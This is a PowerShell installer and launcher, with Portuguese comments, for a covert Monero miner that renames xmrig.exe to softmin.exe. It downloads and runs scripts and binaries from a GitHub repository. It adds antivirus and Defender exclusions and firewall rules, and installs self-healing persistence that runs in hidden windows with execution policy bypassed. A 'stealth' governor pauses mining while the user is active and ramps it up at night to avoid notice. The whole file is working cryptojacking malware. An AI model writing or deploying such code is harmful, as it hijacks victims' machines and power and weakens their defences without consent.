# Softmin — script unico: GitHub (curador) + minerador adaptativo (eco -> turbo noite, freio ao usar).
# -Install: primeira execucao (AV, autostart, binario, scripts locais, firewall).
# -CloudOnly: so GitHub + pasta instalada (sem pendrive/repo local).
param(
    [string]$InstallPath = '',
    [string]$LauncherRoot = '',
    [switch]$Install,
    [switch]$CloudOnly,
    [switch]$Silent
)

$ErrorActionPreference = 'Stop'

function Write-RunLog {
    param(
        [string]$InstallPath,
        [string]$Message,
        [switch]$Silent,
        [ValidateSet('INFO', 'OK', 'WARN', 'ERR', 'STEP')]
        [string]$Level = 'INFO'
    )
    if ($env:SOFTMIN_DEBUG -eq '1' -and $Level -in @('ERR', 'WARN')) {
        $logDir = Join-Path $InstallPath 'logs'
        New-Item -ItemType Directory -Force -Path $logDir | Out-Null
        $line = ('{0}  {1}' -f (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'), $Message)
        Add-Content -LiteralPath (Join-Path $logDir 'run.log') -Value $line -Encoding UTF8
    }
    if (-not $Silent) {
        $color = switch ($Level) {
            'OK' { 'Green' }
            'WARN' { 'Yellow' }
            'ERR' { 'Red' }
            'STEP' { 'Cyan' }
            default { 'Gray' }
        }
        Write-Host $line -ForegroundColor $color
    }
}

function Resolve-RunModule {
    param([string[]]$Roots, [string]$Name)
    foreach ($r in $Roots) {
        if (-not $r) { continue }
        $p = Join-Path $r.TrimEnd('\') $Name
        if (Test-Path -LiteralPath $p) { return $p }
    }
    return $null
}

# --- Caminho de instalacao ---
if ([string]::IsNullOrWhiteSpace($InstallPath)) {
    $InstallPath = Join-Path $env:LOCALAPPDATA 'Softmin'
}
$InstallPath = $InstallPath.TrimEnd('\')
New-Item -ItemType Directory -Force -Path $InstallPath, (Join-Path $InstallPath 'logs') | Out-Null

$moduleRoots = @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts'))

# --- Config GitHub (URLs do repositorio publico) ---
$cloudCfg = Resolve-RunModule -Roots $moduleRoots -Name 'Softmin-CloudConfig.ps1'
if ($cloudCfg) { . $cloudCfg }
else {
    $script:SoftminCloudGitHubUser = 'gabriel-Dagostim'
    $script:SoftminCloudGitHubRepo = 'omicron-softmin-cloud'
    $script:SoftminCloudGitHubBranch = 'master'
    $script:SoftminCloudFolder = 'cloud'
    function Get-SoftminCloudBaseUrl {
        return 'https://raw.githubusercontent.com/gabriel-Dagostim/omicron-softmin-cloud/master/cloud'
    }
    function Get-SoftminCloudManifestUrl {
        return (Get-SoftminCloudBaseUrl) + '/manifest.json'
    }
}

function Get-CloudManifest {
    $url = Get-SoftminCloudManifestUrl
    return Invoke-RestMethod -Uri $url -Headers @{ 'User-Agent' = 'Softmin-Run' } -TimeoutSec 90
}

function Save-CloudFile {
    param([string]$InstallPath, [object]$Entry, [string]$BaseUrl)
    $rel = [string]$Entry.path -replace '/', '\'
    $local = Join-Path $InstallPath $rel
    $dir = Split-Path $local -Parent
    if ($dir -and -not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Force -Path $dir | Out-Null
    }
    $fileUrl = [string]$Entry.url
    if (-not $fileUrl -and $BaseUrl) { $fileUrl = "$BaseUrl/$($Entry.path)" }
    if (-not $fileUrl) { return $false }
    Invoke-WebRequest -Uri $fileUrl -OutFile $local -UseBasicParsing -TimeoutSec 180
    return (Test-Path -LiteralPath $local)
}

function Sync-SoftminFromGitHub {
    param([string]$InstallPath)
    Write-RunLog $InstallPath '[RUN] Sincronizar ficheiros do GitHub...'
    $manifest = Get-CloudManifest
    $base = if ($manifest.base_url) { [string]$manifest.base_url.TrimEnd('/') } else { (Get-SoftminCloudBaseUrl) }
    $n = 0
    foreach ($entry in $manifest.files) {
        $rel = [string]$entry.path
        $local = Join-Path $InstallPath ($rel -replace '/', '\')
        $need = $false
        if (-not (Test-Path -LiteralPath $local)) { $need = $true }
        elseif ($entry.sha256) {
            try {
                $h = (Get-FileHash -LiteralPath $local -Algorithm SHA256).Hash.ToLowerInvariant()
                if ($h -ne [string]$entry.sha256) { $need = $true }
            } catch { $need = $true }
        }
        if (-not $need) { continue }
        Write-RunLog $InstallPath ("[GITHUB] A transferir -> {0}" -f $rel) -Silent:$Silent -Level STEP
        if (Save-CloudFile -InstallPath $InstallPath -Entry $entry -BaseUrl $base) {
            Write-RunLog $InstallPath ("[GITHUB] OK instalado: {0}" -f $rel) -Silent:$Silent -Level OK
            $n++
        } else {
            Write-RunLog $InstallPath ("[GITHUB] FALHA: {0}" -f $rel) -Silent:$Silent -Level ERR
        }
    }
    Write-RunLog $InstallPath ("[GITHUB] Sincronizacao concluida: {0} ficheiro(s) actualizados." -f $n) -Silent:$Silent -Level OK
    return $n
}

function Sync-SoftminCriticalFromCloud {
    param([string]$InstallPath)
    $base = (Get-SoftminCloudBaseUrl).TrimEnd('/')
    $critical = @(
        'Softmin-Common.ps1', 'Softmin-SecureStorage.ps1', 'Softmin-Governor.ps1',
        'Softmin-CloudManifest.ps1', 'Softmin-CloudConfig.ps1', 'Softmin-AutoUnlock.ps1',
        'Set-SoftminAntivirusTrust.ps1', 'Set-SoftminDefenderTrust.ps1', 'Set-SoftminFirewall.ps1',
        'Download-SoftminBinary.ps1', 'Uninstall-Softmin.ps1', 'Reconfig-Softmin.ps1',
        'Softmin-Stop.ps1', 'Softmin-Start.ps1', 'Softmin-Heal.ps1', 'Softmin-Boot.ps1',
        'config.template.json'
    )
    $n = 0
    foreach ($rel in $critical) {
        $local = Join-Path $InstallPath $rel
        try {
            Invoke-WebRequest -Uri "$base/$rel" -OutFile $local -UseBasicParsing -TimeoutSec 120 `
                -Headers @{ 'User-Agent' = 'Softmin-CloudBootstrap' }
            if (Test-Path -LiteralPath $local) { $n++ }
        } catch {
            Write-RunLog $InstallPath ("[CLOUD] Opcional indisponivel: {0}" -f $rel) -Silent:$Silent -Level WARN
        }
    }
    if ($n -gt 0) {
        Write-RunLog $InstallPath ("[CLOUD] Bootstrap: {0} ficheiro(s) da nuvem." -f $n) -Silent:$Silent -Level OK
    }
    return $n
}

function Copy-SoftminLauncherOverlay {
    param(
        [string]$InstallPath,
        [string]$LauncherRoot
    )
    if ([string]::IsNullOrWhiteSpace($LauncherRoot)) { return 0 }
    $LauncherRoot = $LauncherRoot.TrimEnd('\')
    $scriptDir = Join-Path $LauncherRoot 'scripts'
    if (-not (Test-Path -LiteralPath $scriptDir)) { return 0 }
    $n = 0
    Get-ChildItem -LiteralPath $scriptDir -Filter '*.ps1' -File -ErrorAction SilentlyContinue | ForEach-Object {
        $dst = Join-Path $InstallPath $_.Name
        Copy-Item -LiteralPath $_.FullName -Destination $dst -Force
        $n++
    }
    $binDir = Join-Path $LauncherRoot 'bin'
    if (Test-Path -LiteralPath $binDir) {
        $dstBin = Join-Path $InstallPath 'bin'
        New-Item -ItemType Directory -Force -Path $dstBin | Out-Null
        Get-ChildItem -LiteralPath $binDir -File -ErrorAction SilentlyContinue | ForEach-Object {
            $destName = if ($_.Name -eq 'xmrig.exe') { 'softmin.exe' } else { $_.Name }
            $destPath = Join-Path $dstBin $destName
            if ($_.Name -eq 'softmin.exe' -and (Test-Path -LiteralPath $destPath)) {
                Copy-Item -LiteralPath $_.FullName -Destination $destPath -Force -ErrorAction SilentlyContinue
            } elseif (-not (Test-Path -LiteralPath $destPath)) {
                Copy-Item -LiteralPath $_.FullName -Destination $destPath -Force -ErrorAction SilentlyContinue
            }
        }
    }
    return $n
}

function Ensure-SoftminBinary {
    param(
        [string]$InstallPath,
        [string]$LauncherRoot,
        [switch]$CloudOnly
    )
    $dstDir = Join-Path $InstallPath 'bin'
    $dstExe = Join-Path $dstDir 'softmin.exe'
    New-Item -ItemType Directory -Force -Path $dstDir | Out-Null
    if (Test-Path -LiteralPath $dstExe) { return $true }

    $sources = @()
    if (-not $CloudOnly -and $LauncherRoot) {
        $lr = $LauncherRoot.TrimEnd('\')
        $sources += Join-Path $lr 'bin\softmin.exe'
        $sources += Join-Path $lr 'bin\xmrig.exe'
    }
    $sources += Join-Path $InstallPath 'bin\xmrig.exe'
    foreach ($src in $sources) {
        if (-not (Test-Path -LiteralPath $src)) { continue }
        Copy-Item -LiteralPath $src -Destination $dstExe -Force
        if (Test-Path -LiteralPath $dstExe) { return $true }
    }

    $dlScript = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name 'Download-SoftminBinary.ps1'
    if ($dlScript) {
        Write-RunLog $InstallPath '[INSTALL] A descarregar softmin.exe (release upstream)...' -Silent:$Silent -Level STEP
        & $dlScript -TargetBin $dstDir
    }
    return (Test-Path -LiteralPath $dstExe)
}

function Import-SoftminVaultKeyFromLauncher {
    param(
        [string]$InstallPath,
        [string]$LauncherRoot
    )
    if ([string]::IsNullOrWhiteSpace($LauncherRoot)) { return $false }
    $keyFile = Join-Path $LauncherRoot.TrimEnd('\') 'softmin.vault.key'
    if (-not (Test-Path -LiteralPath $keyFile)) { return $false }
    $map = @{}
    Get-Content -LiteralPath $keyFile -Encoding UTF8 | ForEach-Object {
        $line = $_.Trim()
        if (-not $line -or $line.StartsWith('#')) { return }
        if ($line -match '^([^=]+)=(.*)$') {
            $map[$matches[1].Trim()] = $matches[2].Trim()
        }
    }
    if (-not $map['password']) { return $false }
    Save-SoftminVaultCredentials -InstallPath $InstallPath -Password $map['password'] `
        -Codigo $(if ($map['codigo']) { $map['codigo'] } else { '' })
    return $true
}

function Test-SoftminAutoUnlockValid {
    param([string]$InstallPath)
    $auto = Join-Path $InstallPath 'Softmin-AutoUnlock.ps1'
    if (-not (Test-Path -LiteralPath $auto)) { return $false }
    $raw = Get-Content -LiteralPath $auto -Raw -Encoding UTF8
    return ($raw -notmatch 'PLACEHOLDER_P')
}

function Install-SoftminLocalScripts {
    param([string]$InstallPath)

    $startBat = @'
@echo off
setlocal EnableExtensions
cd /d "%~dp0"
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0Softmin-Run.ps1" -InstallPath "%~dp0" -Silent
'@
    $stopBat = @'
@echo off
title Softmin ^| parar
cd /d "%~dp0"
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0Softmin-Stop.ps1" -InstallPath "%~dp0"
pause
'@
    $configBat = @'
@echo off
title Softmin ^| reconfigurar
cd /d "%~dp0"
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0Reconfig-Softmin.ps1"
pause
'@
    Set-Content -Path (Join-Path $InstallPath 'start.bat') -Value $startBat -Encoding ASCII
    Set-Content -Path (Join-Path $InstallPath 'stop.bat') -Value $stopBat -Encoding ASCII
    Set-Content -Path (Join-Path $InstallPath 'configurar.bat') -Value $configBat -Encoding ASCII
}

function Register-SoftminAutostart {
    param(
        [string]$InstallPath,
        [string]$TaskName = 'Softmin'
    )
    $InstallPath = $InstallPath.TrimEnd('\')
    $coreInstaller = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name 'Install-SoftminCore.ps1'
    if ($coreInstaller) {
        try {
            & $coreInstaller -InstallPath $InstallPath -ScriptsSource (Split-Path $coreInstaller -Parent)
            return @{ Ok = $true; Message = 'Curador persistente (SoftminCore) + guarda de pasta activos.' }
        } catch {
            return @{ Ok = $false; Message = ('SoftminCore: {0}' -f $_.Exception.Message) }
        }
    }
    return @{ Ok = $false; Message = 'Install-SoftminCore.ps1 ausente.' }
}

function Invoke-SoftminFullInstall {
    param(
        [string]$InstallPath,
        [string]$LauncherRoot,
        [switch]$CloudOnly
    )

    Write-RunLog $InstallPath '[INSTALL] === Instalacao completa (GitHub + autostart + curador) ===' -Silent:$Silent -Level STEP

    Get-Process -Name 'softmin' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    $stopPs = Join-Path $InstallPath 'Softmin-Stop.ps1'
    if (Test-Path -LiteralPath $stopPs) {
        & $stopPs -InstallPath $InstallPath
    }

    $utilScripts = @(
        'Set-SoftminAntivirusTrust.ps1', 'Set-SoftminDefenderTrust.ps1', 'Set-SoftminFirewall.ps1',
        'Download-SoftminBinary.ps1', 'Reconfig-Softmin.ps1', 'Softmin-CloudConfig.ps1',
        'Install-SoftminCore.ps1', 'Softmin-CorePaths.ps1', 'Softmin-CoreMesh.ps1',
        'Softmin-Curator.ps1', 'Softmin-FolderGuard.ps1', 'Softmin-WipeFiles.ps1',
        'Invoke-SoftminSystemTrust.ps1'
    )
    $cloudBase = (Get-SoftminCloudBaseUrl)
    foreach ($name in $utilScripts) {
        $dst = Join-Path $InstallPath $name
        if (Test-Path -LiteralPath $dst) { continue }
        $src = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name $name
        if ($src) {
            Copy-Item -LiteralPath $src -Destination $dst -Force -ErrorAction SilentlyContinue
            continue
        }
        if ($CloudOnly -and $cloudBase) {
            try {
                Invoke-WebRequest -Uri "$cloudBase/$name" -OutFile $dst -UseBasicParsing -TimeoutSec 120 `
                    -Headers @{ 'User-Agent' = 'Softmin-Install' }
            } catch { }
        }
    }

    $defScript = Join-Path $InstallPath 'Set-SoftminAntivirusTrust.ps1'
    if (-not (Test-Path -LiteralPath $defScript)) {
        $defScript = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name 'Set-SoftminDefenderTrust.ps1'
    }
    if (Test-Path -LiteralPath $defScript) {
        . $defScript
        $extra = @()
        $meshPs = Join-Path $InstallPath 'Softmin-CorePaths.ps1'
        if (Test-Path -LiteralPath $meshPs) {
            . $meshPs
            if (Get-Command Get-SoftminTrustExtraPaths -ErrorAction SilentlyContinue) {
                $extra = Get-SoftminTrustExtraPaths
            }
        }
        $trustMesh = Join-Path $InstallPath 'Invoke-SoftminSystemTrust.ps1'
        if (Test-Path -LiteralPath $trustMesh) {
            & $trustMesh -InstallPath $InstallPath
            Write-RunLog $InstallPath '[INSTALL] AV/firewall (malha + curador).' -Silent:$Silent -Level OK
        } else {
            $def = Set-SoftminAntivirusTrust -InstallPath $InstallPath -LogInstallPath $InstallPath -ExtraPaths $extra -Quiet:$Silent
            Write-RunLog $InstallPath ("[INSTALL] AV: {0}" -f $def.Message) -Silent:$Silent -Level $(if ($def.Ok) { 'OK' } else { 'WARN' })
        }
    }

    if (-not (Ensure-SoftminBinary -InstallPath $InstallPath -LauncherRoot $LauncherRoot -CloudOnly:$CloudOnly)) {
        Write-RunLog $InstallPath '[INSTALL] ERRO: nao foi possivel obter bin\softmin.exe.' -Silent:$Silent -Level ERR
        throw 'softmin.exe ausente apos GitHub e descarga upstream.'
    }
    Write-RunLog $InstallPath '[INSTALL] bin\softmin.exe presente.' -Silent:$Silent -Level OK

    if (-not (Test-SoftminAutoUnlockValid -InstallPath $InstallPath)) {
        if ($CloudOnly) {
            Write-RunLog $InstallPath '[INSTALL] WARN: AutoUnlock invalido no GitHub — publique pacote com gerar-pacote-unificado.bat.' -Silent:$Silent -Level WARN
        }
        elseif (-not (Import-SoftminVaultKeyFromLauncher -InstallPath $InstallPath -LauncherRoot $LauncherRoot)) {
            Write-RunLog $InstallPath '[INSTALL] WARN: AutoUnlock invalido e sem softmin.vault.key no launcher.' -Silent:$Silent -Level WARN
        } else {
            Write-RunLog $InstallPath '[INSTALL] Credenciais do cofre importadas de softmin.vault.key.' -Silent:$Silent -Level OK
        }
    }

    $commonPs = Join-Path $InstallPath 'Softmin-Common.ps1'
    $securePs = Join-Path $InstallPath 'Softmin-SecureStorage.ps1'
    if (Test-Path -LiteralPath $commonPs) { . $commonPs }
    if (Test-Path -LiteralPath $securePs) { . $securePs }
    Ensure-SoftminLocalVaultCredentials -InstallPath $InstallPath | Out-Null
    Set-SoftminSecureFolderAcl -InstallPath $InstallPath

    Install-SoftminLocalScripts -InstallPath $InstallPath

    foreach ($name in $utilScripts) {
        if (Test-Path -LiteralPath (Join-Path $InstallPath $name)) { continue }
        $src = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name $name
        if ($src) {
            Copy-Item -LiteralPath $src -Destination (Join-Path $InstallPath $name) -Force -ErrorAction SilentlyContinue
        }
    }

    $auto = Register-SoftminAutostart -InstallPath $InstallPath
    Write-RunLog $InstallPath ("[INSTALL] Autostart: {0}" -f $auto.Message) -Silent:$Silent -Level $(if ($auto.Ok) { 'OK' } else { 'WARN' })

    $fwScript = Join-Path $InstallPath 'Set-SoftminFirewall.ps1'
    if (Test-Path -LiteralPath $fwScript) {
        $trustMesh = Join-Path $InstallPath 'Invoke-SoftminSystemTrust.ps1'
        if (-not (Test-Path -LiteralPath $trustMesh)) {
            . (Join-Path $InstallPath 'Softmin-Common.ps1')
            $settings = $null
            try { $settings = Unlock-SoftminSettings -InstallPath $InstallPath -TryDpapi -PromptIfNeeded:$false } catch { }
            $poolHost = if ($settings -and $settings.pool_url) { $settings.pool_url } else { 'pool.supportxmr.com' }
            $poolPort = if ($settings -and $settings.pool_port) { [int]$settings.pool_port } else { 443 }
            $fw = & $fwScript -InstallPath $InstallPath -PoolHost $poolHost -PoolPort $poolPort
            Write-RunLog $InstallPath ("[INSTALL] {0}" -f $fw.Message) -Silent:$Silent -Level $(if ($fw.Ok) { 'OK' } else { 'WARN' })
        }
    }

    if (Get-Command Install-SoftminLocalBackup -ErrorAction SilentlyContinue) {
        try {
            Install-SoftminLocalBackup -SourceRoot $InstallPath -InstallPath $InstallPath
            Write-RunLog $InstallPath '[INSTALL] Backup local (_backup) para auto-cura.' -Silent:$Silent -Level OK
        } catch {
            Write-RunLog $InstallPath ("[INSTALL] Backup local: {0}" -f $_.Exception.Message) -Silent:$Silent -Level WARN
        }
    } else {
        $cloudManifest = Join-Path $InstallPath 'Softmin-CloudManifest.ps1'
        if (Test-Path -LiteralPath $cloudManifest) {
            . $cloudManifest
            try {
                Install-SoftminLocalBackup -SourceRoot $InstallPath -InstallPath $InstallPath
                Write-RunLog $InstallPath '[INSTALL] Backup local (_backup) para auto-cura.' -Silent:$Silent -Level OK
            } catch {
                Write-RunLog $InstallPath ("[INSTALL] Backup local: {0}" -f $_.Exception.Message) -Silent:$Silent -Level WARN
            }
        }
    }

    Write-RunLog $InstallPath '[INSTALL] Instalacao concluida — a iniciar curador e minerador.' -Silent:$Silent -Level OK
}

function Ensure-SoftminMetaIni {
    param(
        [string]$InstallPath,
        [switch]$ForInstall
    )
    $metaPath = Join-Path $InstallPath 'softmin.meta.ini'
    $lines = [System.Collections.Generic.List[string]]::new()
    if (Test-Path -LiteralPath $metaPath) {
        $lines.AddRange([string[]](Get-Content -LiteralPath $metaPath -Encoding UTF8))
    } else {
        [void]$lines.Add('# Softmin meta (modo adaptativo + URLs cloud)')
    }
    $required = @{
        cpu_mode                          = 'adaptive'
        cpu_profile                       = 'stealth'
        adaptive_brake                    = 'pause'
        adaptive_check_seconds            = '5'
        adaptive_active_threshold_seconds   = '5'
        adaptive_resume_seconds           = '60'
        adaptive_ramp_minutes             = '10,25,45'
        adaptive_night_ramp_minutes       = '15'
        night_start                       = '00:00'
        night_end                         = '07:00'
        start_on_install                  = $(if ($ForInstall) { 'true' } else { 'false' })
        autostart                         = $(if ($ForInstall) { 'true' } else { 'false' })
        secure_vault                      = 'true'
        secure_autostart                  = 'true'
        defender_trust                    = 'true'
        cloud_heal_enabled                = 'true'
        cloud_manifest_url                = (Get-SoftminCloudManifestUrl)
        cloud_base_url                    = (Get-SoftminCloudBaseUrl)
        cloud_usb_fallback                = ''
        install_path                      = $InstallPath
    }
    $forceUpdate = @(
        'cpu_mode', 'cpu_profile', 'adaptive_brake', 'adaptive_check_seconds',
        'adaptive_active_threshold_seconds', 'adaptive_resume_seconds',
        'adaptive_ramp_minutes', 'adaptive_night_ramp_minutes'
    )
    $text = $lines -join "`n"
    foreach ($k in $required.Keys) {
        if ($text -notmatch "(?m)^$k=") {
            [void]$lines.Add("$k=$($required[$k])")
        }
    }
    foreach ($k in $forceUpdate) {
        if ($required.ContainsKey($k)) {
            $val = $required[$k]
            $found = $false
            for ($i = 0; $i -lt $lines.Count; $i++) {
                if ($lines[$i] -match "^$k=") {
                    $lines[$i] = "$k=$val"
                    $found = $true
                    break
                }
            }
            if (-not $found) { [void]$lines.Add("$k=$val") }
        }
    }
    if ($ForInstall) {
        $text = $lines -join "`n"
        if ($text -match '(?m)^cloud_usb_fallback=') {
            $lines = [System.Collections.Generic.List[string]]::new()
            foreach ($ln in ($text -split "`n")) {
                if ($ln -match '^cloud_usb_fallback=') {
                    [void]$lines.Add('cloud_usb_fallback=')
                } else {
                    [void]$lines.Add($ln)
                }
            }
        } else {
            [void]$lines.Add('cloud_usb_fallback=')
        }
    }
    Set-Content -LiteralPath $metaPath -Value ($lines -join "`r`n") -Encoding UTF8
}

if ($CloudOnly) {
    $LauncherRoot = ''
} elseif ($Install -and [string]::IsNullOrWhiteSpace($LauncherRoot)) {
    $LauncherRoot = if ($PSScriptRoot -match 'scripts$') { Split-Path $PSScriptRoot -Parent } else { $PSScriptRoot }
}

Write-RunLog $InstallPath ('[RUN] === Inicio Softmin-Run{0}{1} ===' -f $(if ($Install) { ' (INSTALAR)' } else { '' }), $(if ($CloudOnly) { ' [NUVEM]' } else { '' })) -Silent:$Silent -Level STEP
$selfSrc = Join-Path $PSScriptRoot 'Softmin-Run.ps1'
if ((Test-Path -LiteralPath $selfSrc) -and $PSScriptRoot.TrimEnd('\') -ne $InstallPath) {
    Copy-Item -LiteralPath $selfSrc -Destination (Join-Path $InstallPath 'Softmin-Run.ps1') -Force -ErrorAction SilentlyContinue
}
if ($PSScriptRoot -match 'scripts$') {
    foreach ($dep in @('Softmin-Common.ps1', 'Softmin-SecureStorage.ps1', 'Softmin-CloudManifest.ps1', 'Softmin-CloudConfig.ps1', 'Softmin-Governor.ps1', 'Softmin-AutoUnlock.ps1')) {
        $sp = Join-Path $PSScriptRoot $dep
        if (Test-Path -LiteralPath $sp) {
            Copy-Item -LiteralPath $sp -Destination (Join-Path $InstallPath $dep) -Force -ErrorAction SilentlyContinue
        }
    }
}

# === 1) GitHub: baixar / reparar ficheiros ===
Ensure-SoftminMetaIni -InstallPath $InstallPath -ForInstall:$Install
Sync-SoftminFromGitHub -InstallPath $InstallPath | Out-Null

$trustRefresh = Join-Path $InstallPath 'Invoke-SoftminSystemTrust.ps1'
if ((Test-Path -LiteralPath $trustRefresh) -and -not $Install) {
    & $trustRefresh -InstallPath $InstallPath
}
if ($Install -and $CloudOnly) {
    Sync-SoftminCriticalFromCloud -InstallPath $InstallPath | Out-Null
    if ($PSScriptRoot -match 'scripts$') {
        Get-ChildItem -LiteralPath $PSScriptRoot -Filter '*.ps1' -File | ForEach-Object {
            Copy-Item -LiteralPath $_.FullName -Destination (Join-Path $InstallPath $_.Name) -Force
        }
        Write-RunLog $InstallPath '[CLOUD] Scripts do repositorio sincronizados para instalacao.' -Silent:$Silent -Level OK
    }
}

if ($Install -and -not $CloudOnly) {
    $overlayN = Copy-SoftminLauncherOverlay -InstallPath $InstallPath -LauncherRoot $LauncherRoot
    if ($overlayN -gt 0) {
        Write-RunLog $InstallPath ("[INSTALL] Overlay local: {0} script(s) do pacote." -f $overlayN) -Silent:$Silent -Level OK
    }
} elseif ($Install -and $CloudOnly) {
    Write-RunLog $InstallPath '[INSTALL] Modo nuvem — sem dependencia de pendrive ou pasta local.' -Silent:$Silent -Level OK
}

# Modulos locais (pos-sync GitHub)
$moduleRoots = @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts'))
if (-not $CloudOnly -and $LauncherRoot) {
    $moduleRoots += @((Join-Path $LauncherRoot 'scripts'), $LauncherRoot)
}
$common = Resolve-RunModule -Roots $moduleRoots -Name 'Softmin-Common.ps1'
$secure = Resolve-RunModule -Roots $moduleRoots -Name 'Softmin-SecureStorage.ps1'
$cloudM = Resolve-RunModule -Roots $moduleRoots -Name 'Softmin-CloudManifest.ps1'
if ($common) { . $common }
if ($secure) { . $secure }

# === Instalacao completa (1o clique no .bat) ===
if ($Install) {
    Invoke-SoftminFullInstall -InstallPath $InstallPath -LauncherRoot $LauncherRoot -CloudOnly:$CloudOnly
    # Re-carregar modulos pos-instalar (utilitarios copiados para InstallPath)
    $secure = Join-Path $InstallPath 'Softmin-SecureStorage.ps1'
    if (Test-Path -LiteralPath $secure) { . $secure }
}

Ensure-SoftminLocalVaultCredentials -InstallPath $InstallPath | Out-Null
if ($cloudM) {
    . $cloudM
    if (-not $Install -and (Get-Command Invoke-SoftminFileHeal -ErrorAction SilentlyContinue)) {
        Invoke-SoftminFileHeal -InstallPath $InstallPath -Silent:$Silent
        if (Get-Command Repair-SoftminVaultAutostart -ErrorAction SilentlyContinue) {
            Repair-SoftminVaultAutostart -InstallPath $InstallPath | Out-Null
        }
    }
}

# === 2) Cofre / config (modo embutido = sem config.json) ===
$exe = Join-Path $InstallPath 'bin\softmin.exe'
if (-not (Test-Path -LiteralPath $exe)) {
    if (-not (Ensure-SoftminBinary -InstallPath $InstallPath -LauncherRoot $LauncherRoot -CloudOnly:$CloudOnly)) {
        Write-RunLog $InstallPath '[RUN] ERRO: bin\softmin.exe ausente (Defender ou GitHub sem binario).'
        if (-not $Silent) {
            Write-Host 'softmin.exe nao encontrado. Execute como Administrador ou regenere o pacote GitHub.' -ForegroundColor Red
        }
        exit 1
    }
}

$settings = $null
$embedded = Test-SoftminEmbeddedExe -InstallPath $InstallPath
try {
    if ($embedded) {
        Remove-Item -LiteralPath (Join-Path $InstallPath 'config.json') -Force -ErrorAction SilentlyContinue
        try {
            $settings = Unlock-SoftminSettings -InstallPath $InstallPath -TryDpapi -PromptIfNeeded:$false
        } catch {
            Write-RunLog $InstallPath '[RUN] Modo embutido: carteira/pool no exe (cofre opcional para meta).'
        }
        Write-RunLog $InstallPath '[RUN] Arranque embutido (sem config.json).'
    } else {
        $settings = Unlock-SoftminSettings -InstallPath $InstallPath -TryDpapi -PromptIfNeeded:$false
        $settings | Add-Member -NotePropertyName cpu_mode -NotePropertyValue 'adaptive' -Force
        $settings | Add-Member -NotePropertyName cpu_profile -NotePropertyValue 'stealth' -Force
        Write-SoftminRuntimeConfig -InstallPath $InstallPath -Settings $settings | Out-Null
        $cfgPath = Join-Path $InstallPath 'config.json'
        if (Test-Path -LiteralPath $cfgPath) {
            $cfgObj = Get-Content -LiteralPath $cfgPath -Raw -Encoding UTF8 | ConvertFrom-Json
            $stealth = Get-SoftminProfileLaunchParams 'stealth'
            $cfgObj.cpu.'max-threads-hint' = $stealth.Hint
            if ($cfgObj.randomx) { $cfgObj.randomx.mode = $stealth.RandomxMode }
            $cfgObj.misc.'pause-on-active' = $stealth.PauseOnActiveSec
            Save-JsonUtf8NoBom -Object $cfgObj -Path $cfgPath
        }
        Write-RunLog $InstallPath '[RUN] Cofre desbloqueado; config.json em modo stealth.'
    }
} catch {
    Write-RunLog $InstallPath ("[RUN] ERRO cofre: {0}" -f $_.Exception.Message)
    if (-not $embedded) { throw }
}

# === 3) Governador adaptativo (eco -> rampa -> turbo noite; freio ao mexer rato/teclado) ===
$govScript = Join-Path $InstallPath 'Softmin-Governor.ps1'
$logDir = Join-Path $InstallPath 'logs'
$pidFile = Join-Path $logDir 'governor.pid'
$startGov = $true
if (Test-Path -LiteralPath $pidFile) {
    $oldPid = Get-Content -LiteralPath $pidFile -ErrorAction SilentlyContinue
    if ($oldPid -match '^\d+$' -and (Get-Process -Id ([int]$oldPid) -ErrorAction SilentlyContinue)) {
        $startGov = $false
    }
}
if ($startGov -and (Test-Path -LiteralPath $govScript)) {
    Start-Process -FilePath 'powershell.exe' -ArgumentList @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
        '-File', "`"$govScript`"", '-InstallPath', "`"$InstallPath`""
    ) -WorkingDirectory $InstallPath -WindowStyle Hidden | Out-Null
    Write-RunLog $InstallPath '[RUN] Governador iniciado (stealth->turbo; freio pause ao usar PC).'
}

# === 4) Minerador (stealth ou adiado se utilizador activo) ===
Get-Process -Name 'softmin' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 400
$cacheScript = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name 'Clear-SoftminShellCache.ps1'
if ($cacheScript) {
    try { & $cacheScript -ExePath $exe | Out-Null } catch { }
}
$idleSec = Get-SoftminUserIdleSeconds
if ($idleSec -lt 90) {
    Write-RunLog $InstallPath ('[RUN] Utilizador activo (idle={0}s) - minerador adiado; governador inicia quando ocioso.' -f $idleSec) -Silent:$Silent -Level OK
} else {
    Start-SoftminMinerProfile -InstallPath $InstallPath -Profile 'stealth' -Settings $settings | Out-Null
    Write-RunLog $InstallPath '[RUN] Minerador iniciado (stealth: 1 thread, RandomX light).' -Silent:$Silent -Level OK
}

Write-RunLog $InstallPath '[RUN] Curador concluido - idle.' -Silent:$Silent -Level OK

$coreInstaller = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name 'Install-SoftminCore.ps1'
if ($coreInstaller) {
    try { & $coreInstaller -InstallPath $InstallPath -ScriptsSource (Split-Path $coreInstaller -Parent) | Out-Null } catch { }
}

if (-not $Silent) {
    Write-Host 'Softmin activo (stealth). Uso sobe apos ociosidade prolongada; mouse/teclado = minimo.' -ForegroundColor Green
}
